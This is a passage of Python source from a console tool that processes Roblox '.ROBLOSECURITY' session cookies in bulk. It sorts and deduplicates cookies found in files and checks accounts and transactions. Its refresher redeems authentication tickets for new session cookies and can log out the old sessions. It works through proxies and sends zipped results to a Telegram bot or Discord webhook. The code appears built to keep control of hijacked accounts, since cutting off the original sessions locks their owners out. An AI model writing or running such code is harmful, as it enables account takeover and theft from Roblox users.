        cmdWriter(f'  ┃\n {ANSI.FG.WHITE}[{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][2])} {MT_Check}\n [{ANSI.FG.RED}D{ANSI.FG.WHITE}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        settingsRCCPlacesPlaceTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
        match settingsRCCPlacesPlaceTab:
            case '1':
                if f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces']:
                    openCustomPlaceGamepasses(listOfRCCCustomPlaces, placeIndex)
                else:
                    openCustomPlaceBadges(listOfRCCCustomPlaces, placeIndex)
            case '2':
                if f'{listOfRCCCustomPlaces[placeIndex]}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] and f'{listOfRCCCustomPlaces[placeIndex]}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
                    openCustomPlaceBadges(listOfRCCCustomPlaces, placeIndex)
                else:
                    removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)
            case 'C' | 'С':
                config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][2] ^= True
                autoSaveConfig()
                removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)
            case 'D' | 'В':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)
                    whileTrueStage6 = True
                    while whileTrueStage6:
                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places, config['Roblox']['CookieChecker']['CustomPlaces'][listOfRCCCustomPlaces[placeIndex]][1][2])}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                        confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                        match confirmTheAction:
                            case 'Y' | 'Н':
                                try: config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].remove(listOfRCCCustomPlaces[placeIndex])
                                except Exception: ...

                                for param in ['', '_Gamepasses', '_Badges']:
                                    try: config['Roblox']['CookieChecker']['CustomPlaces'].remove(f'{listOfRCCCustomPlaces[placeIndex]}{param}')
                                    except Exception: ...

                                try: listOfRCCCustomPlaces.remove(listOfRCCCustomPlaces[placeIndex])
                                except Exception: ...

                                autoSaveConfig()
                                whileTrueStage5 = False
                                whileTrueStage6 = False
                            case 'N' | 'Т':
                                whileTrueStage6 = False

                        removeLines(8)
                else:
                    whileTrueStage5 = False
                    removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)

                    try: config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'].remove(listOfRCCCustomPlaces[placeIndex])
                    except Exception: ...

                    for param in ['', '_Gamepasses', '_Badges']:
                        try: config['Roblox']['CookieChecker']['CustomPlaces'].remove(f'{listOfRCCCustomPlaces[placeIndex]}{param}')
                        except Exception: ...

                    try: listOfRCCCustomPlaces.remove(listOfRCCCustomPlaces[placeIndex])
                    except Exception: ...

                    autoSaveConfig()
            case '0':
                whileTrueStage5 = False
                removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)
            case 'F' | 'А':
                labelASCII()
            case _:
                removeLinesCustomPlaces(listOfRCCCustomPlaces, placeIndex)

def printSortCategories(categories: list) -> None:
    length = len(str(len(categories))) + 12
    for index, category in enumerate(categories):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(category[2] == int and config['Roblox']['CookieChecker']['Sorting'][category[1]][0] or category[2] == str and config['Roblox']['CookieChecker']['Sorting'][category[1]])} {category[0]}\n')

def getSortValuesFrom(category: str, *, checkSortIsEnabled: bool = False, getOnlyEnabledValues: bool = False) -> bool | list[int]:
    if checkSortIsEnabled:
        if not config['Roblox']['CookieChecker']['Sorting'][category][2][0]:
            return False
    
    validateSortValuesFrom(category)

    if getOnlyEnabledValues:
        return [value[0] for value in config['Roblox']['CookieChecker']['Sorting'][category][2][1] if value[1]]

    return config['Roblox']['CookieChecker']['Sorting'][category][2][1]

def validateSortValuesFrom(category: str) -> None:
    listOfValues = config['Roblox']['CookieChecker']['Sorting'][category][2][1]

    i = 0
    while len(listOfValues) > i:
        if str(listOfValues[i][0]).isdigit():
            if type(listOfValues[i][0]) is not int:
                listOfValues[i][0] = int(listOfValues[i][0])
            i += 1
        else:
            listOfValues.pop(i)

    config['Roblox']['CookieChecker']['Sorting'][category][2][1] = sorted(listOfValues)
    autoSaveConfig()

def printSortValuesFrom(sortValues: list[int], category: str) -> None:
    length = len(str(len(sortValues))) + 12
    wordFromLower = MT_From.lower()
    for index, sortValue in enumerate(sortValues):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Sorting'][category][2][1][index][1])} {wordFromLower} {sortValue[0]}\n')

def getSortValuesFromTo(category: str, *, checkSortIsEnabled: bool = False, getOnlyEnabledValues: bool = False) -> bool | list[list[int]]:
    if checkSortIsEnabled:
        if not config['Roblox']['CookieChecker']['Sorting'][category][3][0]:
            return False

    validateSortValuesFromTo(category)

    if getOnlyEnabledValues:
        return [value[0] for value in config['Roblox']['CookieChecker']['Sorting'][category][3][1] if value[1]]

    return config['Roblox']['CookieChecker']['Sorting'][category][3][1]

def validateSortValuesFromTo(category: str) -> None:
    listOfValues = config['Roblox']['CookieChecker']['Sorting'][category][3][1]

    i = 0
    while len(listOfValues) > i:
        if (str(listOfValues[i][0][0]).isdigit() and str(listOfValues[i][0][1]).isdigit()) and int(listOfValues[i][0][0]) < int(listOfValues[i][0][1]):
            if type(listOfValues[i][0][0]) is not int:
                listOfValues[i][0][0] = int(listOfValues[i][0][0])
            if type(listOfValues[i][0][1]) is not int:
                listOfValues[i][0][1] = int(listOfValues[i][0][1])
            i += 1
        else:
            listOfValues.pop(i)

    config['Roblox']['CookieChecker']['Sorting'][category][3][1] = sorted(listOfValues)
    autoSaveConfig()

def printSortValuesFromTo(sortValues: list[list[int]], category: str) -> None:
    length = len(str(len(sortValues))) + 12
    wordFromLower, wordToLower = MT_From.lower(), MT_To.lower()
    for index, sortValue in enumerate(sortValues):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Sorting'][category][3][1][index][1])} {wordFromLower} {sortValue[0][0]} {wordToLower} {sortValue[0][1]}\n')

### Roblox Cookie Sorter

async def robloxCookieSorter() -> None:
    filename = str(config['Roblox']['CookieSorter']['Output_Filename']).strip()
    if not filename or any(char in filename for char in FILENAME_SPECIAL_CHARS):
        filename = 'output'

    searchForNoRobloxCookiePattern = config['Roblox']['CookieSorter']['Search_For_Strings_Similar_To_Roblox_Cookie']
    symbolsBetweenWarningAndCookie = str(config['Roblox']['General']['Symbols_Between_Warning_And_Cookie']).strip() if config['Roblox']['General']['Add_Symbols_Between_Warning_And_Cookie'] else ''
    cookieSortingList = set()
    counters = {
        'unique': 0,
        'duplicates': 0,
        'incorrect': 0
    }

    def robloxCookieSorterWorker(path: Path) -> str:
        for root, dirs, files in path.walk():
            if root == path and 'outputs' in dirs:
                dirs.remove('outputs')

            for file in files:
                counterOfCookies = 0
                cookiesFromFile = open(root / file, 'r', encoding='utf-8', errors='ignore').readlines()
                amountOfCookiesFromFile = len(cookiesFromFile)
                visualRoot = f'.{OS_SEP}' * (len(Path(root).parts) - 1)
                cmdWriter(f'\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Sorting_File} \'{ANSI.DECOR.UNDERLINEON}{visualRoot}{file}{ANSI.DECOR.UNDERLINEOFF}\': 0 {MT_Of} {amountOfCookiesFromFile}')
                for line in cookiesFromFile:
                    counterOfCookies += 1

                    cookie = re.search(COOKIE_PATTERN, line)
                    if not cookie:
                        if not searchForNoRobloxCookiePattern:
                            continue

                        cookie = re.search(STRING_MINIMUM_100_SYMBOLS_PATTERN, line)
                        if not cookie:
                            counters['incorrect'] += 1
                            continue

                        cookie = f'{COOKIE_START}{symbolsBetweenWarningAndCookie}{cookie.group(0)}'
                    else:
                        cookie = cookie.group(0)

                    if cookie not in cookieSortingList:
                        counters['unique'] += 1
                        cookieSortingList.add(cookie)
                    else:
                        counters['duplicates'] += 1

                    cmdWriter(f'\r [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Sorting_File} \'{ANSI.DECOR.UNDERLINEON}{visualRoot}{file}{ANSI.DECOR.UNDERLINEOFF}\': {counterOfCookies} {MT_Of} {amountOfCookiesFromFile}')

    removeLines(10)

    start = timer('start')
    robloxCookieSorterWorker(Path('Roblox', 'Cookie Sorter'))
    stop = timer('stop', start=start)

    if not cookieSortingList:
        return errorOrCorrectHandler(True, MT_No_Cookie_Was_Found, generateVisualPath(MT_Roblox, MT_Cookie_Sorter))

    dateOfSorting = currentDate('%d.%m.%Y - %H.%M.%S')
    savePath = Path('Roblox', 'Cookie Sorter', 'outputs', dateOfSorting)
    savePath.mkdir(parents=True, exist_ok=True)
    with open(savePath / f'{filename}.txt', 'a', encoding='utf-8') as file:
        file.write('\n'.join(cookieSortingList))

    cmdWriter(f'\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] {MT_Unique_Cookies_Found}: {counters['unique']}\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] {MT_Duplicated_Cookies_Removed}: {counters['duplicates']}\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] {MT_Incorrect_Cookies_Removed}: {counters['incorrect']}\n\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Sorting_Complete} {MT_In[1].lower()} {formatDuration(int(stop * 1000))}\n\n')
    playSystemSound()

    if config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] or config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook']:
        messageText = (
            f'<b>💜 {MT_Roblox} {MT_Cookie_Sorter.lower()}\n\n'
            
            f'🟢 {MT_Unique_Cookies_Found}: {counters['unique']} \n'
            f'🟡 {MT_Duplicated_Cookies_Removed}: {counters['duplicates']} \n'
            f'🔴 {MT_Incorrect_Cookies_Removed}: {counters['incorrect']}</b>'
        )
        makeArchive(dateOfSorting, 'Roblox', 'Cookie Sorter', 'outputs')
        _path = Path('Roblox', 'Cookie Sorter', 'outputs', 'archives', f'{dateOfSorting}.zip')
        await sendMessageTelegramBot(messageText, _path)
        sendMessageDiscordWebhook(f'**{messageText.lstrip('<b>').rstrip('</b>')}**', _path)
        cmdWriter('\n')

    waitingInput()

### Roblox Cookie Refresher

async def saveCookieRCR(mode: Literal['MassMode', 'SingleMode'], oldCookie: str, newCookie: str, savePath: Path) -> None:
    savePath.mkdir(parents=True, exist_ok=True)
    modes = config['Roblox']['CookieRefresher'][mode]['Cookie_Save_Mode']
    if 1 in modes or 2 not in modes:
        async with aiofiles.open(savePath / 'old_cookie - new_cookie.txt', 'a', encoding='utf-8', errors='ignore') as file:
            await file.write(f'{oldCookie} > {newCookie}\n')
    if 2 in modes:
        async with aiofiles.open(savePath / 'new_cookie.txt', 'a', encoding='utf-8', errors='ignore') as file:
            await file.write(f'{newCookie}\n')

async def getXCSRFToken(cookies: dict[str, str], proxies: Optional[list[str]] = None) -> str:
    return (await sendPostRequestRoblox('https://auth.roblox.com/v2/logout', cookies=cookies, proxies=proxies)).headers['X-CSRF-Token']

async def getRBXAuthenticationTicket(cookies: dict[str, str], proxies: Optional[list[str]] = None, XCSRFToken: Optional[str] = None) -> tuple[str, str]:
    if XCSRFToken is None:
        XCSRFToken = await getXCSRFToken(cookies, proxies)

    headers = {
        'RBXauthenticationNegotiation': '1',
        'referer': 'https://www.roblox.com/hewhewhew',
        'X-CSRF-Token': XCSRFToken
    }
    isTicket = None
    while True:
        responseHeaders = (await sendPostRequestRoblox('https://auth.roblox.com/v1/authentication-ticket', headers=headers, cookies=cookies, proxies=proxies)).headers
        isTicket = responseHeaders.get('rbx-authentication-ticket')
        if isTicket:
            break
    return isTicket

# async def createNewCookie(cookies: dict[str, str], proxies: Optional[list[str]] = None) -> Optional[str]:
#     XCSRFToken = await getXCSRFToken(cookies, proxies)
#     headers = {
#         'X-CSRF-Token': XCSRFToken
#     }
#     responseHeaders = (await sendPostRequestRoblox('https://auth.roblox.com/v2/session/refresh', headers=headers, cookies=cookies, proxies=proxies)).headers
#     isNewCookie = re.search(COOKIE_PATTERN, str(responseHeaders))
#     if not isNewCookie:
#         raise InvalidCookie

#     if config['Roblox']['CookieRefresher']['Break_Old_Cookies']:
#         await breakOldCookie(cookies, XCSRFToken, proxies)

#     return isNewCookie.group(0)[:-1]

async def createNewCookie(cookies: dict[str, str], proxies: Optional[list[str]] = None) -> Optional[str]:
    XCSRFToken = await getXCSRFToken(cookies, proxies)
    authTicket = await getRBXAuthenticationTicket(cookies, proxies, XCSRFToken)
    headers = {
        'RBXauthenticationNegotiation': '1'
    }
    data = {
        'authenticationTicket': authTicket
    }
    responseHeaders = (await sendPostRequestRoblox('https://auth.roblox.com/v1/authentication-ticket/redeem', data=data, headers=headers, proxies=proxies)).headers
    isNewCookie = re.search(COOKIE_PATTERN, str(responseHeaders))
    if not isNewCookie:
        raise InvalidCookie

    if config['Roblox']['CookieRefresher']['Break_Old_Cookies']:
        await breakOldCookie(cookies, XCSRFToken, proxies)
    return isNewCookie.group(0)[:-1]

async def breakOldCookie(cookies: dict[str, str], XCSRFToken: str, proxies: Optional[list[str]] = None) -> None:
    headers = {
        'Cookie': f'.ROBLOSECURITY: {cookies['.ROBLOSECURITY']}',
        'X-CSRF-Token': XCSRFToken,
        'Set-Cookie': '.ROBLOSECURITY=; Max-Age=0; Path=/;'
    }
    await sendPostRequestRoblox('https://auth.roblox.com/v2/logout', cookies=cookies, headers=headers, proxies=proxies)

async def massModeRCR(cookies: dict, savePath: Path, proxies: Optional[list[str]] = None) -> None:
    cookie = cookies['.ROBLOSECURITY']
    oldCookie = f'{cookie[115:130]}...{cookie[-15:-1]}'
    try:
        newCookie = await createNewCookie(cookies, proxies)
        await saveCookieRCR('MassMode', oldCookie, newCookie, savePath)
        cmdWriter(f' [{ANSI.FG.GREEN}>{ANSI.FG.WHITE}] {oldCookie} {ANSI.FG.CYAN}>{ANSI.FG.WHITE} {newCookie[115:130]}...{newCookie[-15:-1]}\n')
    except InvalidCookie:
        cmdWriter(f' [{ANSI.FG.RED}>{ANSI.FG.WHITE}] {oldCookie} {ANSI.FG.CYAN}>{ANSI.FG.WHITE} {MT_Invalid_Cookie}\n')

async def cookieRefresherSingleMode(string: str):
    labelASCII()
    cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode)}\n\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] ┃ {MT_Wait[0]}...\n')

    symbolsBetweenWarningAndCookie = str(config['Roblox']['General']['Symbols_Between_Warning_And_Cookie']).strip() if config['Roblox']['General']['Add_Symbols_Between_Warning_And_Cookie'] else ''
    cookie = re.search(COOKIE_PATTERN, string)
    if not cookie:
        cookie = re.search(STRING_MINIMUM_100_SYMBOLS_PATTERN, string)
        if not cookie:
            return errorOrCorrectHandler(True, MT_Incorrect_Cookie, generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode))
        
        cookie = f'{COOKIE_START}{symbolsBetweenWarningAndCookie}{cookie.group(0)}'
    else:
        cookie = cookie.group(0)

    isUseProxy = config['Roblox']['General']['Proxy']['Use_Proxy']
    proxiesFromFile = getProxiesFromFileRoblox(isUseProxy, Path('Roblox', 'proxies.txt'), generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode))
    if isUseProxy and not proxiesFromFile:
        return

    try:
        isNewCookie = await createNewCookie({'.ROBLOSECURITY': cookie}, proxiesFromFile)
    except InvalidCookie:
        return errorOrCorrectHandler(True, MT_Invalid_Cookie, generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode))

    await saveCookieRCR('SingleMode', f'{cookie[115:130]}...{cookie[-15:-1]}', isNewCookie, Path('Roblox', 'Cookie Refresher', 'Single Mode', 'outputs', currentDate('%d.%m.%Y - %H.%M.%S')))

    removeLines(3)
    cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode)}\n\n{isNewCookie}\n\n')
    waitingInput()

async def cookieRefresherMassMode(file: str) -> None:
    labelASCII()
    cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Mass_Mode)}\n\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Wait[0]}...')

    isUseProxy = config['Roblox']['General']['Proxy']['Use_Proxy']
    proxiesFromFile = getProxiesFromFileRoblox(isUseProxy, Path('Roblox', 'proxies.txt'), generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Mass_Mode))
    if isUseProxy and not proxiesFromFile:
        return

    cookiesFromFile = getCookiesFromFileRoblox(Path('Roblox', 'Cookie Refresher', 'Mass Mode', file), generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Mass_Mode))
    if not cookiesFromFile:
        return

    dateOfRefreshing = currentDate('%d.%m.%Y - %H.%M.%S')
    savePath = Path('Roblox', 'Cookie Refresher', 'Mass Mode', 'outputs', dateOfRefreshing)

    cmdWriter(f'\r [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINEON}{file}{ANSI.DECOR.UNDERLINEOFF}\':\n')
    
    start = timer('start')
    await asyncio.gather(
        *(massModeRCR({'.ROBLOSECURITY': cookie}, savePath, proxiesFromFile) for cookie in cookiesFromFile)
    )
    stop = timer('stop', start=start)

    cmdWriter(f' [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Checking_Complete} {MT_In[1].lower()} {formatDuration(int(stop * 1000))}\n\n')
    playSystemSound()
    
    if config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] or config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook']:
        messageText = (
            f'<b>💜 {MT_Roblox} {MT_Cookie_Refresher.lower()}</b>'
        )
        makeArchive(dateOfRefreshing, 'Roblox', 'Cookie Refresher', 'Mass Mode', 'outputs')
        _path = Path('Roblox', 'Cookie Refresher', 'Mass Mode', 'outputs', 'archives', f'{dateOfRefreshing}.zip')
        await sendMessageTelegramBot(messageText, _path)
        sendMessageDiscordWebhook(f'**{messageText.lstrip('<b>').rstrip('</b>')}**', _path)
        cmdWriter('\n')

    waitingInput()

### Transaction Analysis

def printPlacesRTA() -> None:
    listOfRTAPlaces = list(config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'])
    if listOfRTAPlaces:
        for index, place in enumerate(listOfRTAPlaces):
            length = len(str(len(listOfRTAPlaces))) + 12
            if str(listOfRTAPlaces[index]).isdigit() and (str(listOfRTAPlaces[index]) in config['Roblox']['TransactionAnalysis']['Places']):
                cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(config['Roblox']['TransactionAnalysis']['Places'][str(place)][2])} {config['Roblox']['TransactionAnalysis']['Places'][str(place)][1][0] if config['Roblox']['TransactionAnalysis']['Places'][str(place)][1][0] else f'Unknown_{place}'} {f'({config['Roblox']['TransactionAnalysis']['Places'][str(place)][0]})' if config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'] else ''}\n')
            else:
                config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].remove(place)
        autoSaveConfig()

def printPlaceIgnoreNamesRTA(placeId: str) -> None:
    length = len(str(len(config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List']))) + 12
    for index, ignoreName in enumerate(config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List']):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {enabledOrDisabledOption(ignoreName[1])} {ignoreName[0]}\n')

def addPlaceIgnoreNameRTA(ignoreName: str, placeId: str) -> None:
    if ignoreName == '0': return
    if len(ignoreName) > 50:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Name.format('50'), generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, placeId, MT_Ignore_List))
    if ignoreName in [name[0] for name in config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List']]:
        return errorOrCorrectHandler(True, MT_Transaction_With_This_Name_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, placeId, MT_Ignore_List))

    config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List'].append([ignoreName, False])
    autoSaveConfig()

def placeContextMenuRTA(placeIndex: int) -> None:
    labelASCII()
    placeId = str(config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'][placeIndex])
    whileTrueStage5 = True
    while whileTrueStage5:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, placeId)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Ignore_List}\n  ┃\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['TransactionAnalysis']['Places'][placeId][2])} {MT_Check}\n [{ANSI.FG.RED}D{ANSI.FG.WHITE}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        settingsRTAPlacesPlaceTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
        match settingsRTAPlacesPlaceTab:
            case '0':
                whileTrueStage5 = False
            case '1':
                removeLines(9)
                whileTrueStage6 = True
                while whileTrueStage6:
                    cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, placeId, MT_Ignore_List)}\n\n')
                    printPlaceIgnoreNamesRTA(placeId)
                    cmdWriter(f'{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Ignore_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Do_Not_Ignore_All}\n  ┃\n' if config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List'] else ''} [{ANSI.FG.YELLOW}A{ANSI.FG.WHITE}] ┃ {MT_Add_A_Transaction}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['TransactionAnalysis']['Places'][placeId][3])} {MT_Discover_New_Names_For_Ignore_List}\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['TransactionAnalysis']['Places'][placeId][4])} {MT_Count_Robux_In_Total}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                    settingsRTAIgnoreListTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                    match settingsRTAIgnoreListTab:
                        case settingsRTAIgnoreListTab if settingsRTAIgnoreListTab.startswith('0'):
                            if len(settingsRTAIgnoreListTab) == 1:
                                whileTrueStage6 = False
                        case settingsRTAIgnoreListTab if (settingsRTAIgnoreListTab.isdigit() and int(settingsRTAIgnoreListTab) <= len(config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List'])):
                            labelASCII()
                            ignoreItem = config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List'][int(settingsRTAIgnoreListTab) - 1]
                            whileTrueStage7 = True
                            while whileTrueStage7:
                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, placeId, MT_Ignore_List, ignoreItem[0])}\n\n [{ANSI.FG.YELLOW}I{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(ignoreItem[1])} {MT_Ignore}\n [{ANSI.FG.RED}D{ANSI.FG.WHITE}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                settingsRTAIgnoreListIgnoreNameTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match settingsRTAIgnoreListIgnoreNameTab:
                                    case '0':
                                        whileTrueStage7 = False
                                    case 'I' | 'Ш':
                                        ignoreItem[1] ^= True
                                    case 'D' | 'В':
                                        if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                                            removeLines(7)
                                            whileTrueStage8 = True
                                            while whileTrueStage8:
                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, placeId, MT_Ignore_List, ignoreItem[0])}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}{ANSI.FG.WHITE}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}{ANSI.FG.WHITE}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                                                confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                match confirmTheAction:
                                                    case 'Y' | 'Н':
                                                        try: config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List'].remove(ignoreItem)
                                                        except Exception: ...

                                                        autoSaveConfig()
                                                        whileTrueStage7 = False
                                                        whileTrueStage8 = False
                                                    case 'N' | 'Т':
                                                        whileTrueStage8 = False

                                                removeLines(8)
                                        else:
                                            removeLines(7)

                                            try: config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List'].remove(ignoreItem)
                                            except Exception: ...

                                            autoSaveConfig()
                                            whileTrueStage7 = False
                                    case 'F' | 'А':
                                        labelASCII()
                                    case _:
                                        removeLines(7)

                                autoSaveConfigAndRemoveLinesInSettings(settingsRTAIgnoreListIgnoreNameTab, ('I', 'Ш'), ('0', 'I', 'Ш'), 7)
                        case 'A' | 'Ф':
                            labelASCII()
                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, placeId, MT_Ignore_List)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n')
                            settingsRTAPlaceIgnoreNameAdd = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_A_Transaction_Name}: ').strip()
                            addPlaceIgnoreNameRTA(settingsRTAPlaceIgnoreNameAdd, placeId)
                        case '+' | '=':
                            for ignoreName in config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List']:
                                ignoreName[1] = True
                        case '-' | '_':
                            for ignoreName in config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List']:
                                ignoreName[1] = False
                        case 'S' | 'Ы':
                            config['Roblox']['TransactionAnalysis']['Places'][placeId][3] ^= True
                        case 'C' | 'С':
                            config['Roblox']['TransactionAnalysis']['Places'][placeId][4] ^= True
                    labelASCII()
                    autoSaveConfigAndRemoveLinesInSettings(settingsRTAIgnoreListTab, ('+', '=', '-', '_', 'S', 'Ы', 'C', 'С'), (), 0)
            case 'C' | 'С':
                config['Roblox']['TransactionAnalysis']['Places'][placeId][2] ^= True
            case 'D' | 'В':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    removeLines(9)
                    whileTrueStage6 = True
                    while whileTrueStage6:
                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places, config['Roblox']['TransactionAnalysis']['Places'][placeId][1][0])}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                        confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                        match confirmTheAction:
                            case 'Y' | 'Н':
                                try: config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].remove(int(placeId))
                                except Exception: ...

                                try: config['Roblox']['TransactionAnalysis']['Places'].remove(placeId)
                                except Exception: ...

                                try: config['Roblox']['TransactionAnalysis']['Places'].remove(f'{placeId}_Ignore_List')
                                except Exception: ...

                                autoSaveConfig()
                                whileTrueStage5 = False
                                whileTrueStage6 = False
                            case 'N' | 'Т':
                                whileTrueStage6 = False

                        removeLines(8)
                else:
                    whileTrueStage5 = False
                    removeLines(9)

                    try: config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].remove(int(placeId))
                    except Exception: ...

